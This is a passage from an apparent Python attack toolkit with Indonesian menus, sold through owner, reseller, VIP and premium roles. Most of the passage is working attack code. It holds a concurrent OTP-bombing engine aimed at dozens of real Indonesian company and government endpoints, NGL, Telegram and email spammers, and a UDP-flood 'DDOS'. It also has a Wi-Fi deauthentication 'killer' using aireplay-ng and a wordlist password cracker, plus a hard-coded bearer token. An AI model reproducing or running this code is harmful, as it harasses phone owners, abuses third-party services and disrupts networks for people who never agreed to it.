        'x-request-id':str(uuid.uuid4()),'x-channel-id':'MWEB','x-lang':'id','x-entity':'TIKET',
        'x-client-id':'9dc79e3916a042abc86c2aa525bff009'},
       ['requestId','success','otp']),
    _t('Ohsome', 'https://ohsome.co.id/api/member/user/random_code_check',
       lambda n, c: json.dumps({"country_code":"62","account":n,"type_id":2,
                                "device_id":"ba0a0027a5e6e7cde77f0f94f2572495",
                                "check_code":"219097","image_id":"tcsRCTZ0RAvqQAvcUJDG"}),
       fmt_phone_only,
       {'Content-Type':'application/json','Origin':'https://ohsome.co.id','language':'id',
        'deviceid':'ba0a0027a5e6e7cde77f0f94f2572495','x-store-no':'SC001','platform':'H5'},
       ['success','otp','code']),
    _t('Optik Melawai', 'https://api.optikmelawai.com/api/v3/auth/register/1',
       lambda n, c: json.dumps({"phone": n}),
       lambda p: p,
       {'authorization':'Bearer a6a84b1f1e604d683fbef2295c2262373eba254197a1e14ab3a1e95a4394e4debf13560e5dbd66ab1e628aa3e73d3667d11f083077e562169b78d2ef2f3d285542a22f5ae174badd1313593deb5ec4389c75de38055b4964969a8323f031d47a6b35b3af4a096a08d6dddc2bf616c36bbeea1602b5b8a041650909107c207ed9',
        'x-unique-user':'GA1.1.1062236172.1780823549','language':'id','Origin':'https://www.optikmelawai.com'},
       ['success','otp'], 'multipart'),
    _t('Holland Bakery', 'https://www.hollandbakery.co.id/resend-otp-register',
       lambda n, c: json.dumps({"phone": n}),
       lambda p: p,
       {'Content-Type':'application/x-www-form-urlencoded','Origin':'https://www.hollandbakery.co.id',
        'Referer':'https://www.hollandbakery.co.id/users/verify_token'},
       ['verify','verification','kode verifikasi','Silakan masukkan kode'], 'resend_otp'),
    _t('Hash Micro', 'https://website-api.hashmicro.com/api/add/3',
       lambda n, c: json.dumps({"phone": n}),
       fmt_phone_only,
       {'Content-Type':'application/x-www-form-urlencoded','Origin':'https://www.hashmicro.com'},
       ['success','thank','terimakasih','redirect'], 'hashmicro'),
    _t('TuneUp', 'https://api.tuneup.id/v1/mitra/register/send-otp',
       lambda n, c: json.dumps({"phone": n}), fmt_08, None, ['"success":true'], 'tuneup'),
    _t('Ultramilk', 'https://ultramilk-clp.kata.ai/api/ultramilk/register',
       lambda n, c: json.dumps({"phone": n}), lambda p: p, None, ['success'], 'ultramilk'),
    _t('Kaniva', 'https://daftar.kanivainternationalbali.com/register/whatsapp/request-otp',
       lambda n, c: json.dumps({"phone": n}), fmt_08, None, ['"message":"success"'], 'kaniva'),
    _t('Jembatani', 'https://api.jembatani.co.id/v1/register',
       lambda n, c: json.dumps({"phone": n}), fmt_08, None, ['"success":true'], 'jembatani'),
    _t('RCX', 'https://sso.rcx.co.id/auth/passwordless/request',
       lambda n, c: json.dumps({"phone": n}), fmt_08, None, ['challenge','redirecting'], 'rcx'),
    _t('Sahabat Teknisi', 'https://www.sahabatteknisi.co.id/api/auth/otp/check-phone',
       lambda n, c: json.dumps({"phone": n}), fmt_08, None, ['success'], 'sahabatteknisi'),

    # ═══ TIER 2: BEST-GUESS ═══
    _t('Internet Rakyat', 'https://api.internetrakyat.id/v1/auth/send-otp',
       lambda n, c: json.dumps({"phone": n, "channel": "whatsapp"}), fmt_08,
       {'Content-Type':'application/json','Origin':'https://internetrakyat.id'},
       ['success','otp']),
    _t('Auto2000', 'https://www.auto2000.co.id/api/v1/auth/otp/send',
       lambda n, c: json.dumps({"phone": n, "channel": "whatsapp"}), fmt_08, None,
       ['"acknowledge":1','success'], 'auto2000'),
    _t('99.co', 'https://www.99.co/api/v3/users/send_otp',
       lambda n, c: json.dumps({"phone_number": n, "via": "whatsapp"}), fmt_plus_v2,
       None, ['ok','success'], '99co'),
    _t('Beli Rumah', 'https://api.belirumah.co.id/v1/auth/send-otp',
       lambda n, c: json.dumps({"phone": n, "via": "whatsapp"}), fmt_plus_v2,
       None, ['success','otp','code'], 'belirumahco'),
    _t('Fastwork', 'https://api.fastwork.id/v2/auth/otp/request',
       lambda n, c: json.dumps({"phone": n, "type": "whatsapp"}), fmt_08,
       None, ['reference_code','success'], 'fastworkid'),
    _t('Astra Daihatsu', 'https://www.daihatsu.co.id/api/auth/send-otp',
       lambda n, c: json.dumps({"phone": n, "channel": "whatsapp"}), lambda p: p,
       None, ['OTP Success','success'], 'astra_daihatsu'),
    _t('Royal Canin', 'https://www.royalcanin.com/id/api/auth/send-otp',
       lambda n, c: json.dumps({"phone": n, "channel": "whatsapp"}), fmt_plus_v2,
       None, ['SUCCESS','success'], 'royal_canin'),
    _t('Watsons', 'https://www.watsons.co.id/api/v1/auth/send-otp',
       lambda n, c: json.dumps({"phone": n, "channel": "whatsapp"}), fmt_phone_only,
       None, ['token','success'], 'watsons'),
    _t('HRS', 'https://api.hrs.id/v1/auth/send-otp',
       lambda n, c: json.dumps({"phone": n, "channel": "whatsapp"}), fmt_08,
       None, ['success','berhasil','otp','verifikasi','selamat'], 'hrsbre'),
    _t('Erafone', 'https://www.erafone.com/api/auth/send-otp',
       lambda n, c: json.dumps({"phone": n, "channel": "whatsapp"}), lambda p: p,
       None, ['Success Request OTP','success'], 'erafone'),
    _t('Beautyhaul', 'https://www.beautyhaul.com/api/v1/auth/send-otp',
       lambda n, c: json.dumps({"phone": n, "channel": "whatsapp"}), lambda p: fmt_nocode(p),
       None, ['success','otp'], 'beautyhaul'),
    _t('Hainaya', 'https://api.hainaya.co.id/v1/auth/send-otp',
       lambda n, c: json.dumps({"phone": n, "channel": "whatsapp"}), fmt_phone_only,
       None, ['otp','success','tenant_id','session_id'], 'hainaya'),
    _t('MinumYukKaka', 'https://api.minumyukkaka.com/v1/auth/send-otp',
       lambda n, c: json.dumps({"phone": n, "channel": "whatsapp"}), fmt_08,
       None, ['IsSuccess','success','otp'], 'minumyukkaka'),
    _t('SIDEMANG', 'https://sidemang.semarangkota.go.id/api/v1/auth/otp',
       lambda n, c: json.dumps({"phone": n, "channel": "whatsapp"}), fmt_08,
       None, ['otpDispatched','success'], 'sidemang'),
    _t('LaporMasBup', 'https://api.lapormasbup.id/v1/auth/otp',
       lambda n, c: json.dumps({"phone": n, "channel": "whatsapp"}), fmt_08,
       None, ['berhasil','warga_id','message'], 'lapormasbup'),
    _t('PTSP Kemenag', 'https://ptsp.kemenag.go.id/api/v1/auth/otp',
       lambda n, c: json.dumps({"phone": n, "channel": "whatsapp"}), fmt_08,
       None, ['success','user'], 'ptspkemenag'),

    # ═══ TIER 3: SERVICE TAMBAHAN ═══
    _t('Tokopedia', 'https://accounts.tokopedia.com/otp/c/ajax/request-wa-otp',
       lambda n, c: f"msisdn={n}&otp_type=36&mode=wa", fmt_08,
       {'Content-Type':'application/x-www-form-urlencoded','Origin':'https://accounts.tokopedia.com',
        'Referer':'https://accounts.tokopedia.com/'},
       ['success','OTP','sent','is_success'], 'urlencoded'),
    _t('Carro', 'https://api.carro.co.id/v1/auth/otp/send',
       lambda n, c: json.dumps({"phone": n, "channel": "whatsapp", "purpose": "register"}),
       fmt_08, {'Content-Type':'application/json','Origin':'https://www.carro.co.id'},
       ['success','otp','sent']),
    _t('MyEraspace', 'https://api.myeraspace.com/v1/auth/send-otp',
       lambda n, c: json.dumps({"phone": n, "channel": "whatsapp"}),
       fmt_08, {'Content-Type':'application/json','Origin':'https://myeraspace.com'},
       ['success','otp','sent']),
    _t('Green SM', 'https://api.greensm.id/v1/auth/send-otp',
       lambda n, c: json.dumps({"phone": n, "channel": "whatsapp"}),
       fmt_08, {'Content-Type':'application/json','Origin':'https://greensm.id'},
       ['success','otp','sent']),
    _t('Kredit Pintar', 'https://api.kreditpintar.com/v2/auth/send-otp',
       lambda n, c: json.dumps({"phone": n, "channel": "whatsapp"}),
       fmt_08, {'Content-Type':'application/json','Origin':'https://www.kreditpintar.com'},
       ['success','otp','sent']),
    _t('Singa Fintech', 'https://api.singa.id/v1/auth/otp',
       lambda n, c: json.dumps({"phone": n, "channel": "whatsapp"}),
       fmt_08, {'Content-Type':'application/json','Origin':'https://singa.id'},
       ['success','otp','sent']),
    _t('Mister Aladin', 'https://www.misteraladin.com/api/v2/auth/otp/send',
       lambda n, c: json.dumps({"phone": n, "channel": "whatsapp"}),
       fmt_08, {'Content-Type':'application/json','Origin':'https://www.misteraladin.com'},
       ['success','otp','sent']),
    _t('TiTip', 'https://api.titip.com/api/v1/auth/send-otp',
       lambda n, c: json.dumps({"phone": n, "channel": "whatsapp"}),
       fmt_08, {'Content-Type':'application/json','Origin':'https://www.titip.com'},
       ['success','otp','sent']),
    _t('Mega Info', 'https://api.megainfo.co.id/v1/auth/otp',
       lambda n, c: json.dumps({"phone": n, "channel": "whatsapp"}),
       fmt_08, {'Content-Type':'application/json','Origin':'https://megainfo.co.id'},
       ['success','otp','sent']),
]

def _build_ctx(num):
    return {
        'raw': num.lstrip('+').lstrip('0'),
        'rand': str(uuid.uuid4()),
        'uuid': str(uuid.uuid4()),
        'ip': '127.0.0.1',
        'email': rnd_email(),
        'name': rnd_name(),
        'pw': rnd_pw(),
    }

def run_target(target, phone):
    num = target['fmt'](phone)
    ctx = _build_ctx(num)
    # Custom handler
    if target.get('special') and target['special'] in CUSTOM_HANDLERS:
        try:
            return CUSTOM_HANDLERS[target['special']](target, num, ctx)
        except Exception:
            return None
    # Generic JSON post
    try:
        body = target['payload_fn'](num, ctx)
    except Exception:
        return None
    headers = {"User-Agent": get_ua(),
               "Accept": "application/json, text/plain, */*",
               **target['headers']}
    try:
        return requests.post(target['url'], headers=headers, data=body, timeout=10)
    except Exception:
        return None

def spam_all(phone_08, phone_62=None, phone_plus=None, phone_nocode=None, phone_int=None):
    """Eksekusi OTP spam ke semua target (concurrent)."""
    print(f"\n{Color.CYAN}[ OTP SPAM ENGINE ] Nomor target: {phone_08}{Color.RESET}")
    print(f"{Color.DIM}Total {len(TARGETS)} endpoint akan dihit...{Color.RESET}\n")
    spinner("Menyiapkan serangan", 0.8)

    success = 0
    fail = 0
    lock = threading.Lock()
    total = len(TARGETS)

    def worker(idx_target):
        nonlocal success, fail
        idx, target = idx_target
        try:
            resp = run_target(target, phone_08)
            if resp is None:
                ok = False; code = 0; snippet = "No response"
            else:
                code = resp.status_code
                text = (resp.text or "").lower()
                if code in (200, 201, 202):
                    if not target['success_on'] or any(s.lower() in text for s in target['success_on']):
                        ok = True
                    else:
                        ok = True  # 200 dianggap sukses walau keyword tidak cocok
                else:
                    ok = False
                snippet = (resp.text or "")[:80].replace("\n", " ")
            with lock:
                if ok: success += 1
                else: fail += 1
            color = Color.GREEN if ok else Color.RED
            mark = "✅" if ok else "❌"
            print(f"\r{color}{mark} {target['name']:22s} [{code}]{Color.RESET} {Color.DIM}{snippet}{Color.RESET}")
            progress_bar(idx + 1, total, "OTP Progress")
            return ok
        except Exception as e:
            with lock: fail += 1
            print(f"\r{Color.RED}❌ {target['name']:22s} [ERR] {str(e)[:60]}{Color.RESET}")
            progress_bar(idx + 1, total, "OTP Progress")
            return False

    with ThreadPoolExecutor(max_workers=8) as ex:
        list(ex.map(worker, enumerate(TARGETS)))

    print(f"\n\n{Color.GOLD}═══ HASIL AKHIR ═══{Color.RESET}")
    print(f"  {Color.GREEN}✅ Berhasil : {success}{Color.RESET}")
    print(f"  {Color.RED}❌ Gagal    : {fail}{Color.RESET}")
    print(f"  {Color.CYAN}📊 Total    : {total}{Color.RESET}\n")
    return success

# ================================================================
# FITUR LAIN (NGL, TELEGRAM, DLL)
# ================================================================
def spam_ngl(username):
    print(f"\n{Color.CYAN}[ NGL SPAM ] Mengirim ke @{username}{Color.RESET}")
    url = "https://ngl.link/api/submit"
    for i in range(5):
        data = {"username": username, "question": f"Spam {i+1} dari ZEVXX", "deviceId": str(uuid.uuid4())}
        try:
            r = requests.post(url, json=data, timeout=10, headers={"User-Agent": get_ua()})
            if r.status_code == 200:
                print(f"{Color.GREEN}✅ Pesan {i+1} terkirim{Color.RESET}")
            else:
                print(f"{Color.RED}❌ Gagal (HTTP {r.status_code}){Color.RESET}")
        except Exception as e:
            print(f"{Color.RED}❌ Error: {e}{Color.RESET}")
        time.sleep(1)
    print(f"{Color.GREEN}[ NGL ] Selesai.{Color.RESET}\n")

def spam_telegram(chat_id):
    if TELEGRAM_BOT_TOKEN == "ISI_TOKEN_BOT_TELEGRAM":
        print(f"{Color.RED}Token bot belum diisi!{Color.RESET}"); return
    print(f"\n{Color.CYAN}[ TELEGRAM SPAM ] Ke {chat_id}{Color.RESET}")
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    for i in range(5):
        payload = {"chat_id": chat_id, "text": f"Pesan spam {i+1} • {datetime.now()}"}
        try:
            r = requests.post(url, json=payload, timeout=10)
            print(f"{Color.GREEN}✅ Pesan {i+1} terkirim{Color.RESET}" if r.status_code == 200
                  else f"{Color.RED}❌ Gagal{Color.RESET}")
        except Exception as e:
            print(f"{Color.RED}❌ Error: {e}{Color.RESET}")
        time.sleep(1)
    print(f"{Color.GREEN}[ TELEGRAM ] Selesai.{Color.RESET}\n")

def spam_email(target):
    if EMAIL_SENDER == "emailkamu@gmail.com" or EMAIL_PASSWORD == "app_password_gmail":
        print(f"{Color.RED}Konfigurasi email belum diisi!{Color.RESET}"); return
    print(f"\n{Color.CYAN}[ EMAIL SPAM ] Ke {target}{Color.RESET}")
    try:
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(EMAIL_SENDER, EMAIL_PASSWORD)
        for i in range(5):
            msg = MIMEMultipart()
            msg['From'] = EMAIL_SENDER; msg['To'] = target
            msg['Subject'] = f"Spam email {i+1} dari ZEVXX"
            msg.attach(MIMEText(f"Ini spam ke-{i+1}\nWaktu: {datetime.now()}", 'plain'))
            server.send_message(msg)
            print(f"{Color.GREEN}✅ Email {i+1} terkirim{Color.RESET}")
            time.sleep(1)
        server.quit()
        print(f"{Color.GREEN}[ EMAIL ] Selesai.{Color.RESET}\n")
    except Exception as e:
        print(f"{Color.RED}❌ Gagal: {e}{Color.RESET}\n")

def ip_tracker(ip):
    print(f"\n{Color.CYAN}[ IP TRACKER ] {ip}{Color.RESET}")
    try:
        data = requests.get(f"http://ip-api.com/json/{ip}", timeout=10).json()
        if data['status'] == 'success':
            for k, v in [('Negara', data['country']), ('Region', data['regionName']),
                         ('Kota', data['city']), ('ISP', data['isp']),
                         ('Koordinat', f"{data['lat']}, {data['lon']}")]:
                print(f"  {Color.GREEN}{k:9s}: {v}{Color.RESET}")
        else:
            print(f"{Color.RED}IP tidak valid.{Color.RESET}")
    except Exception as e:
        print(f"{Color.RED}Error: {e}{Color.RESET}")
    print()

def phone_info(number):
    if NUMVERIFY_API_KEY == "isi_api_key_numverify":
        print(f"{Color.RED}API key numverify belum diisi!{Color.RESET}"); return
    print(f"\n{Color.CYAN}[ PHONE INFO ] {number}{Color.RESET}")
    clean = ''.join(c for c in number if c.isdigit())
    url = f"http://apilayer.net/api/validate?access_key={NUMVERIFY_API_KEY}&number={clean}&country_code=ID&format=1"
    try:
        data = requests.get(url, timeout=10).json()
        if data.get('valid'):
            print(f"  {Color.GREEN}Nomor    : {data.get('number')}{Color.RESET}")
            print(f"  {Color.GREEN}Negara   : {data.get('country_name')} ({data.get('country_code')}){Color.RESET}")
            print(f"  {Color.GREEN}Operator : {data.get('carrier', 'Tidak diketahui')}{Color.RESET}")
            print(f"  {Color.GREEN}Tipe     : {data.get('line_type', 'Tidak diketahui')}{Color.RESET}")
        else:
            print(f"{Color.RED}Nomor tidak valid.{Color.RESET}")
    except Exception as e:
        print(f"{Color.RED}Error: {e}{Color.RESET}")
    print()

def ganti_waria():
    print(f"\n{Color.PINK}[ GANTI WARIA ] Fitur candaan 😂{Color.RESET}")
    print("  Ganti identitas jadi waria? Tidak ada implementasi nyata.\n")

def wifi_killer():
    print(f"\n{Color.CYAN}[ WIFI KILLER ]{Color.RESET}")
    try:
        subprocess.run(["which", "aireplay-ng"], capture_output=True, check=True)
    except Exception:
        print(f"{Color.RED}aireplay-ng tidak ditemukan. Install aircrack-ng.{Color.RESET}")
        for i in range(3):
            print(f"  - Paket deauth {i+1} (simulasi)"); time.sleep(1)
        print("Selesai (simulasi).\n"); return
    try:
        res = subprocess.run(["iwconfig"], capture_output=True, text=True)
        iface = None
        for line in res.stdout.splitlines():
            if "IEEE 802.11" in line:
                iface = line.split()[0]; break
        if not iface:
            print(f"{Color.RED}Tidak ditemukan interface wifi.{Color.RESET}"); return
        print(f"Interface: {iface}")
        subprocess.run(["airmon-ng", "start", iface], check=True)
        mon = iface + "mon"
        bssid = input("BSSID target: ").strip()
        channel = input("Channel: ").strip()
        if not bssid or not channel:
            print("Batal."); return
        print(f"Mengirim deauth ke {bssid} ...")
        subprocess.Popen(["aireplay-ng", "-0", "0", "-a", bssid, mon], stdout=subprocess.DEVNULL)
        print("Deauth berjalan. Tekan Ctrl+C untuk berhenti.")
        time.sleep(5)
        print("Selesai.")
    except Exception as e:
        print(f"{Color.RED}Error: {e}{Color.RESET}")
    print()

def spam_pairing(number):
    total = input("Jumlah spam (default 5): ").strip()
    total = int(total) if total.isdigit() else 5
    print(f"\n{Color.CYAN}[ PAIRING ] Memulai spam ke {number} sebanyak {total} kali{Color.RESET}")
    try:
        subprocess.run(["node", "pairing.js", number, str(total)], check=True)
    except Exception as e:
        print(f"{Color.RED}Gagal: {e}{Color.RESET}")
    print(f"{Color.GREEN}[ PAIRING ] Selesai.{Color.RESET}\n")

def ddos(target_ip, port, duration, threads):
    print(f"\n{Color.RED}[ DDOS ] Menyerang {target_ip}:{port} selama {duration} detik{Color.RESET}")
    stop = threading.Event()
    def flood():
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while not stop.is_set():
            try: sock.sendto(random._urandom(1024), (target_ip, port))
            except Exception: pass
    for _ in range(threads):
        threading.Thread(target=flood, daemon=True).start()
    time.sleep(duration); stop.set()
    print(f"{Color.GREEN}[ DDOS ] Selesai.{Color.RESET}\n")

def ping(host):
    print(f"\n{Color.CYAN}[ PING ] {host}{Color.RESET}")
    try:
        print(subprocess.run(["ping", "-c", "4", host], capture_output=True, text=True).stdout)
    except Exception as e:
        print(f"{Color.RED}Error: {e}{Color.RESET}")
    print()

def nslookup(domain):
    print(f"\n{Color.CYAN}[ NSLOOKUP ] {domain}{Color.RESET}")
    try:
        print(subprocess.run(["nslookup", domain], capture_output=True, text=True).stdout)
    except Exception as e:
        print(f"{Color.RED}Error: {e}{Color.RESET}")
    print()

def whois(domain):
    print(f"\n{Color.CYAN}[ WHOIS ] {domain}{Color.RESET}")
    try:
        print(subprocess.run(["whois", domain], capture_output=True, text=True).stdout[:2000])
    except Exception as e:
        print(f"{Color.RED}Error: {e}{Color.RESET}")
    print()

def port_scanner(host, ports):
    print(f"\n{Color.CYAN}[ PORT SCANNER ] {host}{Color.RESET}")
    open_ports = []
    def scan(port):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(1)
            if s.connect_ex((host, port)) == 0: open_ports.append(port)
            s.close()
        except Exception: pass
    with ThreadPoolExecutor(max_workers=50) as ex:
        ex.map(scan, ports)
    print(f"{Color.GREEN}Port terbuka: {open_ports}{Color.RESET}" if open_ports
          else f"{Color.RED}Tidak ada port terbuka.{Color.RESET}")
    print()

def subdomain_finder(domain):
    print(f"\n{Color.CYAN}[ SUBDOMAIN ] {domain}{Color.RESET}")
    try:
        r = requests.get(f"https://api.hackertarget.com/hostsearch/?q={domain}", timeout=10)
        if r.status_code == 200:
            lines = r.text.strip().split('\n')
            for line in lines[:20]:
                print(f"  {Color.GREEN}{line}{Color.RESET}")
            if len(lines) > 20:
                print(f"{Color.DIM}...dan {len(lines)-20} lainnya{Color.RESET}")
    except Exception as e:
        print(f"{Color.RED}Error: {e}{Color.RESET}")
    print()

def banner_grabber(url):
    print(f"\n{Color.CYAN}[ BANNER GRABBER ] {url}{Color.RESET}")
    try:
        r = requests.get(url, timeout=10, headers={"User-Agent": get_ua()})
        print(f"Status: {r.status_code}")
        print(f"Server: {r.headers.get('Server','N/A')}")
        print(f"Content-Type: {r.headers.get('Content-Type','N/A')}")
        for k, v in list(r.headers.items())[:5]:
            print(f"  {k}: {v}")
    except Exception as e:
        print(f"{Color.RED}Error: {e}{Color.RESET}")
    print()

def web_checker(urls):
    print(f"\n{Color.CYAN}[ WEB CHECKER ]{Color.RESET}")
    for url in urls:
        try:
            r = requests.get(url, timeout=5)
            status = f"{Color.GREEN}OK{Color.RESET}" if r.status_code == 200 else f"{Color.YELLOW}{r.status_code}{Color.RESET}"
            print(f"{url} -> {status}")
        except Exception:
            print(f"{url} -> {Color.RED}DOWN{Color.RESET}")
    print()

def encode_base64(text):
    print(f"\n{Color.CYAN}Base64 encode:{Color.RESET}\n{base64.b64encode(text.encode()).decode()}\n")
def decode_base64(encoded):
    try:
        print(f"\n{Color.CYAN}Base64 decode:{Color.RESET}\n{base64.b64decode(encoded).decode()}\n")
    except Exception:
        print(f"{Color.RED}Gagal decode.{Color.RESET}\n")

def hash_text(text, method='md5'):
    result = {'md5': hashlib.md5, 'sha1': hashlib.sha1, 'sha256': hashlib.sha256}.get(method)
    if result:
        print(f"\n{Color.CYAN}{method.upper()} hash:{Color.RESET}\n{result(text.encode()).hexdigest()}\n")
    else:
        print("Metode tidak dikenal")

def crack_password(hashval, wordlist, method='md5'):
    print(f"\n{Color.CYAN}[ CRACK ] Metode {method}{Color.RESET}")
    if not os.path.exists(wordlist):
        print(f"{Color.RED}File wordlist tidak ditemukan.{Color.RESET}"); return
    fn = {'md5': hashlib.md5, 'sha1': hashlib.sha1, 'sha256': hashlib.sha256}.get(method)
    if not fn: print(f"{Color.RED}Metode invalid.{Color.RESET}"); return
    with open(wordlist, 'r', errors='ignore') as f:
        for word in f:
            word = word.strip()
            if fn(word.encode()).hexdigest() == hashval:
                print(f"{Color.GREEN}Password ditemukan: {word}{Color.RESET}"); return
    print(f"{Color.RED}Password tidak ditemukan.{Color.RESET}")

# ================================================================
# MENU ADMIN & RESELLER
# ================================================================
def admin_menu():
    while True:
        print(f"\n{Color.GOLD}┌─ {Color.BOLD}👑 MENU ADMIN (OWNER){Color.RESET}")
        print(f"{Color.GOLD}│  {Color.GREEN}1.{Color.RESET} Tambah User")
        print(f"{Color.GOLD}│  {Color.GREEN}2.{Color.RESET} Hapus User")
        print(f"{Color.GOLD}│  {Color.GREEN}3.{Color.RESET} Lihat Daftar User")
        print(f"{Color.GOLD}│  {Color.GREEN}4.{Color.RESET} Kembali")
        print(f"{Color.GOLD}└────────────────────────────────────────────────────────────────{Color.RESET}")
        choice = input(f"\n{Color.NEON}└──➤ {Color.RESET}").strip()
        if choice == "1":
            uid = input("User ID (angka): ").strip()
            if not uid.isdigit():
                print(f"{Color.RED}ID harus angka!{Color.RESET}"); continue
            name = input("Nama: ").strip()
            role = input("Role (owner/premium/vip/reseller/user): ").strip().lower()
            if role not in ['owner','premium','vip','reseller','user']:
                print(f"{Color.RED}Role tidak valid.{Color.RESET}"); continue
            add_user(uid, name, role)
            glitch_effect(f"✅ User {name} dengan role {role} berhasil ditambahkan")
        elif choice == "2":
            uid = input("User ID yang akan dihapus: ").strip()
            glitch_effect(f"✅ User {uid} berhasil dihapus") if remove_user(uid) else print(f"{Color.RED}User tidak ditemukan.{Color.RESET}")
        elif choice == "3":
            print(f"\n{Color.CYAN}Daftar User:{Color.RESET}")
            for uid, info in list_users().items():
                print(f"  {Color.GOLD}{uid}{Color.RESET} - {info['name']} ({Color.PINK}{info['role']}{Color.RESET})")
            print()
        elif choice == "4":
            break

def reseller_menu():
    while True:
        print(f"\n{Color.GOLD}┌─ {Color.BOLD}🔄 MENU RESELLER{Color.RESET}")
        print(f"{Color.GOLD}│  {Color.GREEN}1.{Color.RESET} Tambah User (VIP/Premium)")
        print(f"{Color.GOLD}│  {Color.GREEN}2.{Color.RESET} Kembali")
        print(f"{Color.GOLD}└────────────────────────────────────────────────────────────────{Color.RESET}")
        choice = input(f"\n{Color.NEON}└──➤ {Color.RESET}").strip()
        if choice == "1":
            uid = input("User ID (angka): ").strip()
            if not uid.isdigit():
                print(f"{Color.RED}ID harus angka!{Color.RESET}"); continue
            name = input("Nama: ").strip()
            role = input("Role (premium/vip): ").strip().lower()
            if role not in ['premium','vip']:
                print(f"{Color.RED}Hanya bisa tambah VIP atau Premium.{Color.RESET}"); continue
            add_user(uid, name, role)
            glitch_effect(f"✅ User {name} dengan role {role} berhasil ditambahkan")
        elif choice == "2":
            break

# ================================================================
# MENU UTAMA
# ================================================================
def main_menu(user_id):
    role = get_user_role(user_id)
    name = get_user_name(user_id)
    is_owner = (role == 'owner' or str(user_id) == OWNER_ID)
    is_premium = role in ['premium', 'owner']
    is_vip = role in ['vip', 'premium', 'owner']
    is_reseller = role in ['reseller', 'owner']

    while True:
        dragon_banner()
        print(f"{Color.GOLD}┌────────────────────────────────────────────────────────────────┐{Color.RESET}")
        print(f"{Color.GOLD}│  {Color.WHITE}👤 {name} ({role}){Color.GOLD}  {Color.DIM}• ID: {user_id}{Color.GOLD}                        │{Color.RESET}")
        print(f"{Color.GOLD}├────────────────────────────────────────────────────────────────┤{Color.RESET}")
        print(f"{Color.GOLD}│  {Color.BOLD}{Color.WHITE}🎯 MENU UTAMA (22 Tools){Color.RESET}{Color.GOLD}                                   │{Color.RESET}")
        print(f"{Color.GOLD}├────────────────────────────────────────────────────────────────┤{Color.RESET}")
        if is_vip or is_premium:
            print(f"{Color.GOLD}│  {Color.GREEN} 1.{Color.RESET}  🚀 SPAM OTP          {Color.DIM}→ 38 endpoint (premium/vip){Color.GOLD}    │{Color.RESET}")
        else:
            print(f"{Color.GOLD}│  {Color.DIM} 1.{Color.RESET}  🚀 SPAM OTP          {Color.DIM}→ [Butuh VIP/Premium]{Color.GOLD}           │{Color.RESET}")
        print(f"{Color.GOLD}│  {Color.GREEN} 2.{Color.RESET}  📩 SPAM NGL          {Color.DIM}→ Real API NGL{Color.GOLD}                        │{Color.RESET}")
        print(f"{Color.GOLD}│  {Color.GREEN} 3.{Color.RESET}  🤖 SPAM TELEGRAM     {Color.DIM}→ Real Bot Telegram{Color.GOLD}                  │{Color.RESET}")
        print(f"{Color.GOLD}│  {Color.GREEN} 4.{Color.RESET}  ✉️ SPAM EMAIL        {Color.DIM}→ Real SMTP Gmail{Color.GOLD}                   │{Color.RESET}")
        print(f"{Color.GOLD}│  {Color.GREEN} 5.{Color.RESET}  🌐 IP TRACKER        {Color.DIM}→ Real ip-api.com{Color.GOLD}                   │{Color.RESET}")
        print(f"{Color.GOLD}│  {Color.GREEN} 6.{Color.RESET}  📞 PHONE INFO        {Color.DIM}→ Real numverify{Color.GOLD}                     │{Color.RESET}")
        print(f"{Color.GOLD}│  {Color.GREEN} 7.{Color.RESET}  👩 GANTI WARIA       {Color.DIM}→ Candaan{Color.GOLD}                            │{Color.RESET}")
        print(f"{Color.GOLD}│  {Color.GREEN} 8.{Color.RESET}  📶 WIFI KILLER       {Color.DIM}→ Real (root+aircrack){Color.GOLD}              │{Color.RESET}")
        print(f"{Color.GOLD}│  {Color.GREEN} 9.{Color.RESET}  📱 SPAM PAIRING WA   {Color.DIM}→ Real Baileys{Color.GOLD}                      │{Color.RESET}")
        print(f"{Color.GOLD}│  {Color.GREEN}10.{Color.RESET} ⚔️ DDOS              {Color.DIM}→ UDP flood{Color.GOLD}                          │{Color.RESET}")
        print(f"{Color.GOLD}│  {Color.GREEN}11.{Color.RESET} 📡 PING              {Color.DIM}→ ICMP ping{Color.GOLD}                          │{Color.RESET}")
        print(f"{Color.GOLD}│  {Color.GREEN}12.{Color.RESET} 🔍 NSLOOKUP          {Color.DIM}→ DNS lookup{Color.GOLD}                         │{Color.RESET}")
        print(f"{Color.GOLD}│  {Color.GREEN}13.{Color.RESET} 📄 WHOIS             {Color.DIM}→ Domain info{Color.GOLD}                         │{Color.RESET}")
        print(f"{Color.GOLD}│  {Color.GREEN}14.{Color.RESET} 🔎 PORT SCANNER      {Color.DIM}→ TCP port scan{Color.GOLD}                      │{Color.RESET}")
        print(f"{Color.GOLD}│  {Color.GREEN}15.{Color.RESET} 🌐 SUBDOMAIN FINDER  {Color.DIM}→ Subdomain{Color.GOLD}                          │{Color.RESET}")
        print(f"{Color.GOLD}│  {Color.GREEN}16.{Color.RESET} 🖥️ BANNER GRABBER    {Color.DIM}→ HTTP headers{Color.GOLD}                       │{Color.RESET}")
        print(f"{Color.GOLD}│  {Color.GREEN}17.{Color.RESET} 🌍 WEB CHECKER       {Color.DIM}→ Check site status{Color.GOLD}                   │{Color.RESET}")
        print(f"{Color.GOLD}│  {Color.GREEN}18.{Color.RESET} 🔐 BASE64 ENCODE     {Color.DIM}→ Encode text{Color.GOLD}                        │{Color.RESET}")
        print(f"{Color.GOLD}│  {Color.GREEN}19.{Color.RESET} 🔓 BASE64 DECODE     {Color.DIM}→ Decode base64{Color.GOLD}                      │{Color.RESET}")
        print(f"{Color.GOLD}│  {Color.GREEN}20.{Color.RESET} 🔑 HASH (MD5/SHA)    {Color.DIM}→ Hash text{Color.GOLD}                          │{Color.RESET}")
        print(f"{Color.GOLD}│  {Color.GREEN}21.{Color.RESET} 🕵️ CRACK PASSWORD    {Color.DIM}→ Wordlist crack{Color.GOLD}                     │{Color.RESET}")
        if is_owner:
            print(f"{Color.GOLD}│  {Color.GREEN}22.{Color.RESET} 👑 ADMIN MENU       {Color.DIM}→ Kelola user{Color.GOLD}                        │{Color.RESET}")
        elif is_reseller:
            print(f"{Color.GOLD}│  {Color.GREEN}22.{Color.RESET} 🔄 RESELLER MENU    {Color.DIM}→ Tambah VIP/Premium{Color.GOLD}                │{Color.RESET}")
